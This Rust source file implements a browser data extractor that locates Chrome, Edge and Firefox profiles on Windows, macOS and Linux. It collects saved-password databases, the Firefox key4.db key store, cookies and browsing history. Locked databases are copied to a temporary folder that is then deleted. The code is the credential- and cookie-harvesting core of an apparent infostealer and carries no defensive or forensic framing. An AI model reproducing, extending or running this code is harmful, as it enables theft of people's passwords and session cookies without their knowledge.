use std::collections::BTreeMap;
use std::env;
use std::fs;
use std::path::{Path, PathBuf};

use super::errors::ExtractionError;
use super::types::{DataType, ExtractedData, ExtractionResult, ExtractionTarget};

/// Extracts browser data (passwords, cookies, history)
pub struct BrowserExtractor {
    extract_passwords: bool,
    extract_cookies: bool,
    extract_history: bool,
}

impl BrowserExtractor {
    pub fn new(
        extract_passwords: bool,
        extract_cookies: bool,
        extract_history: bool,
    ) -> Self {
        Self {
            extract_passwords,
            extract_cookies,
            extract_history,
        }
    }
    
    /// Extract all browser data
    pub fn extract_all(&self) -> Vec<ExtractionResult> {
        let mut results = Vec::new();
        
        // Chrome-based browsers
        if self.extract_passwords {
            results.push(self.extract_chrome_passwords());
            results.push(self.extract_edge_passwords());
        }
        
        if self.extract_cookies {
            results.push(self.extract_chrome_cookies());
        }
        
        if self.extract_history {
            results.push(self.extract_chrome_history());
        }
        
        // Firefox
        if self.extract_passwords {
            results.push(self.extract_firefox_passwords());
        }
        
        if self.extract_cookies {
            results.push(self.extract_firefox_cookies());
        }
        
        results
    }
    
    /// Extract Chrome passwords
    pub fn extract_chrome_passwords(&self) -> ExtractionResult {
        let targets = Self::chrome_profile_paths();
        let mut data = Vec::new();
        
        for profile_path in targets {
            let login_data = profile_path.join("Login Data");
            
            if !login_data.exists() {
                continue;
            }
            
            // Copy the database (it may be locked by browser)
            match self.copy_and_read_database(&login_data, "Login Data") {
                Ok(content) => {
                    let mut metadata = BTreeMap::new();
                    metadata.insert("browser".to_string(), "chrome".to_string());
                    metadata.insert("type".to_string(), "passwords".to_string());
                    metadata.insert("source_path".to_string(), login_data.display().to_string());
                    metadata.insert("extracted_at".to_string(), get_timestamp());
                    
                    data.push(ExtractedData {
                        target: ExtractionTarget::ChromePasswords,
                        name: "chrome_login_data".to_string(),
                        data_type: DataType::Database,
                        content,
                        metadata,
                    });
                }
                Err(e) => {
                    return ExtractionResult::failure(
                        ExtractionTarget::ChromePasswords,
                        format!("Failed to extract Chrome passwords: {}", e),
                    );
                }
            }
        }
        
        if data.is_empty() {
            return ExtractionResult::failure(
                ExtractionTarget::ChromePasswords,
                "Chrome Login Data not found".to_string(),
            );
        }
        
        ExtractionResult::success(ExtractionTarget::ChromePasswords, data)
    }
    
    /// Extract Chrome cookies
    pub fn extract_chrome_cookies(&self) -> ExtractionResult {
        let targets = Self::chrome_profile_paths();
        let mut data = Vec::new();
        
        for profile_path in targets {
            let cookies_db = profile_path.join("Cookies");
            
            if !cookies_db.exists() {
                continue;
            }
            
            match fs::read(&cookies_db) {
                Ok(content) => {
                    let mut metadata = BTreeMap::new();
                    metadata.insert("browser".to_string(), "chrome".to_string());
                    metadata.insert("type".to_string(), "cookies".to_string());
                    metadata.insert("source_path".to_string(), cookies_db.display().to_string());
                    metadata.insert("extracted_at".to_string(), get_timestamp());
                    
                    data.push(ExtractedData {
                        target: ExtractionTarget::ChromeCookies,
                        name: "chrome_cookies".to_string(),
                        data_type: DataType::Database,
                        content,
                        metadata,
                    });
                }
                Err(e) => {
                    return ExtractionResult::failure(
                        ExtractionTarget::ChromeCookies,
                        format!("Failed to extract Chrome cookies: {}", e),
                    );
                }
            }
        }
        
        if data.is_empty() {
            return ExtractionResult::failure(
                ExtractionTarget::ChromeCookies,
                "Chrome Cookies database not found".to_string(),
            );
        }
        
        ExtractionResult::success(ExtractionTarget::ChromeCookies, data)
    }
    
    /// Extract Chrome history
    pub fn extract_chrome_history(&self) -> ExtractionResult {
        let targets = Self::chrome_profile_paths();
        let mut data = Vec::new();
        
        for profile_path in targets {
            let history_db = profile_path.join("History");
            
            if !history_db.exists() {
                continue;
            }
            
            match fs::read(&history_db) {
                Ok(content) => {
                    let mut metadata = BTreeMap::new();
                    metadata.insert("browser".to_string(), "chrome".to_string());
                    metadata.insert("type".to_string(), "history".to_string());
                    metadata.insert("source_path".to_string(), history_db.display().to_string());
                    metadata.insert("extracted_at".to_string(), get_timestamp());
                    
                    data.push(ExtractedData {
                        target: ExtractionTarget::ChromeHistory,
                        name: "chrome_history".to_string(),
                        data_type: DataType::Database,
                        content,
                        metadata,
                    });
                }
                Err(e) => {
                    return ExtractionResult::failure(
                        ExtractionTarget::ChromeHistory,
                        format!("Failed to extract Chrome history: {}", e),
                    );
                }
            }
        }
        
        if data.is_empty() {
            return ExtractionResult::failure(
                ExtractionTarget::ChromeHistory,
                "Chrome History database not found".to_string(),
            );
        }
        
        ExtractionResult::success(ExtractionTarget::ChromeHistory, data)
    }
    
    /// Extract Firefox passwords (logins.json)
    pub fn extract_firefox_passwords(&self) -> ExtractionResult {
        let targets = Self::firefox_profile_paths();
        let mut data = Vec::new();
        
        for profile_path in targets {
            let logins_json = profile_path.join("logins.json");
            let key4_db = profile_path.join("key4.db");
            
            if !logins_json.exists() {
                continue;
            }
            
            // Extract logins.json
            match fs::read(&logins_json) {
                Ok(content) => {
                    let mut metadata = BTreeMap::new();
                    metadata.insert("browser".to_string(), "firefox".to_string());
                    metadata.insert("type".to_string(), "passwords".to_string());
                    metadata.insert("source_path".to_string(), logins_json.display().to_string());
                    metadata.insert("extracted_at".to_string(), get_timestamp());
                    
                    data.push(ExtractedData {
                        target: ExtractionTarget::FirefoxPasswords,
                        name: "firefox_logins".to_string(),
                        data_type: DataType::Json,
                        content,
                        metadata,
                    });
                }
                Err(e) => {
                    return ExtractionResult::failure(
                        ExtractionTarget::FirefoxPasswords,
                        format!("Failed to extract Firefox passwords: {}", e),
                    );
                }
            }
            
            // Also extract key4.db if it exists (needed for decryption)
            if key4_db.exists() {
                if let Ok(content) = fs::read(&key4_db) {
                    let mut metadata = BTreeMap::new();
                    metadata.insert("browser".to_string(), "firefox".to_string());
                    metadata.insert("type".to_string(), "key_database".to_string());
                    metadata.insert("source_path".to_string(), key4_db.display().to_string());
                    metadata.insert("extracted_at".to_string(), get_timestamp());
                    
                    data.push(ExtractedData {
                        target: ExtractionTarget::FirefoxPasswords,
                        name: "firefox_key4".to_string(),
                        data_type: DataType::Database,
                        content,
                        metadata,
                    });
                }
            }
        }
        
        if data.is_empty() {
            return ExtractionResult::failure(
                ExtractionTarget::FirefoxPasswords,
                "Firefox logins.json not found".to_string(),
            );
        }
        
        ExtractionResult::success(ExtractionTarget::FirefoxPasswords, data)
    }
    
    /// Extract Firefox cookies
    pub fn extract_firefox_cookies(&self) -> ExtractionResult {
        let targets = Self::firefox_profile_paths();
        let mut data = Vec::new();
        
        for profile_path in targets {
            let cookies_db = profile_path.join("cookies.sqlite");
            
            if !cookies_db.exists() {
                continue;
            }
            
            match fs::read(&cookies_db) {
                Ok(content) => {
                    let mut metadata = BTreeMap::new();
                    metadata.insert("browser".to_string(), "firefox".to_string());
                    metadata.insert("type".to_string(), "cookies".to_string());
                    metadata.insert("source_path".to_string(), cookies_db.display().to_string());
                    metadata.insert("extracted_at".to_string(), get_timestamp());
                    
                    data.push(ExtractedData {
                        target: ExtractionTarget::FirefoxCookies,
                        name: "firefox_cookies".to_string(),
                        data_type: DataType::Database,
                        content,
                        metadata,
                    });
                }
                Err(e) => {
                    return ExtractionResult::failure(
                        ExtractionTarget::FirefoxCookies,
                        format!("Failed to extract Firefox cookies: {}", e),
                    );
                }
            }
        }
        
        if data.is_empty() {
            return ExtractionResult::failure(
                ExtractionTarget::FirefoxCookies,
                "Firefox cookies.sqlite not found".to_string(),
            );
        }
        
        ExtractionResult::success(ExtractionTarget::FirefoxCookies, data)
    }
    
    /// Extract Edge passwords
    pub fn extract_edge_passwords(&self) -> ExtractionResult {
        let targets = Self::edge_profile_paths();
        let mut data = Vec::new();
        
        for profile_path in targets {
            let login_data = profile_path.join("Login Data");
            
            if !login_data.exists() {
                continue;
            }
            
            match fs::read(&login_data) {
                Ok(content) => {
                    let mut metadata = BTreeMap::new();
                    metadata.insert("browser".to_string(), "edge".to_string());
                    metadata.insert("type".to_string(), "passwords".to_string());
                    metadata.insert("source_path".to_string(), login_data.display().to_string());
                    metadata.insert("extracted_at".to_string(), get_timestamp());
                    
                    data.push(ExtractedData {
                        target: ExtractionTarget::EdgePasswords,
                        name: "edge_login_data".to_string(),
                        data_type: DataType::Database,
                        content,
                        metadata,
                    });
                }
                Err(e) => {
                    return ExtractionResult::failure(
                        ExtractionTarget::EdgePasswords,
                        format!("Failed to extract Edge passwords: {}", e),
                    );
                }
            }
        }
        
        if data.is_empty() {
            return ExtractionResult::failure(
                ExtractionTarget::EdgePasswords,
                "Edge Login Data not found".to_string(),
            );
        }
        
        ExtractionResult::success(ExtractionTarget::EdgePasswords, data)
    }
    
    fn copy_and_read_database(
        &self,
        source: &Path,
        name: &str,
    ) -> Result<Vec<u8>, ExtractionError> {
        // Create temp directory
        let temp_dir = env::temp_dir().join(format!("hmm_{}", get_timestamp()));
        fs::create_dir_all(&temp_dir)?;
        
        let temp_path = temp_dir.join(name);
        
        // Copy database to temp (to avoid locking issues)
        fs::copy(source, &temp_path)?;
        
        // Read the copy
        let content = fs::read(&temp_path)?;
        
        // Cleanup
        let _ = fs::remove_file(&temp_path);
        let _ = fs::remove_dir(&temp_dir);
        
        Ok(content)
    }
    
    // Platform-specific path helpers
    
    fn chrome_profile_paths() -> Vec<PathBuf> {
        let mut paths = Vec::new();
        
        if let Some(home) = env::var_os("HOME") {
            // Linux
            paths.push(PathBuf::from(&home).join(
                ".config/google-chrome/Default"
            ));
            
            // macOS
            paths.push(PathBuf::from(&home).join(
                "Library/Application Support/Google/Chrome/Default"
            ));
        }
        
        if let Some(appdata) = env::var_os("APPDATA") {
            // Windows
            paths.push(PathBuf::from(&appdata).join(
                "Google/Chrome/User Data/Default"
            ));
        }
        
        paths
    }
    
    fn firefox_profile_paths() -> Vec<PathBuf> {
        let mut paths = Vec::new();
        
        if let Some(home) = env::var_os("HOME") {
            // Linux
            let firefox_dir = PathBuf::from(&home).join(".mozilla/firefox");
            if let Ok(entries) = fs::read_dir(&firefox_dir) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_dir() && path.extension().map_or(false, |e| e == "default") {
                        paths.push(path);
                    }
                }
            }
            
            // macOS
            let firefox_dir = PathBuf::from(&home).join(
                "Library/Application Support/Firefox/Profiles"
            );
            if let Ok(entries) = fs::read_dir(&firefox_dir) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_dir() && path.extension().map_or(false, |e| e == "default") {
                        paths.push(path);
                    }
                }
            }
        }
        
        if let Some(appdata) = env::var_os("APPDATA") {
            // Windows
            let firefox_dir = PathBuf::from(&appdata).join("Mozilla/Firefox/Profiles");
            if let Ok(entries) = fs::read_dir(&firefox_dir) {
                for entry in entries.flatten() {
                    let path = entry.path();
                    if path.is_dir() && path.extension().map_or(false, |e| e == "default") {
                        paths.push(path);
                    }
                }
            }
        }
        
        paths
    }
    
    fn edge_profile_paths() -> Vec<PathBuf> {
        let mut paths = Vec::new();
        
        if let Some(home) = env::var_os("HOME") {
            // Linux (if Edge is available)
            paths.push(PathBuf::from(&home).join(
                ".config/microsoft-edge/Default"
            ));
            
            // macOS
            paths.push(PathBuf::from(&home).join(
                "Library/Application Support/Microsoft Edge/Default"
            ));
        }
        
        if let Some(appdata) = env::var_os("APPDATA") {
            // Windows
            paths.push(PathBuf::from(&appdata).join(
                "Microsoft/Edge/User Data/Default"
            ));
        }
        
        paths
    }
}

fn get_timestamp() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_secs().to_string())
        .unwrap_or_else(|_| "0".to_string())
}
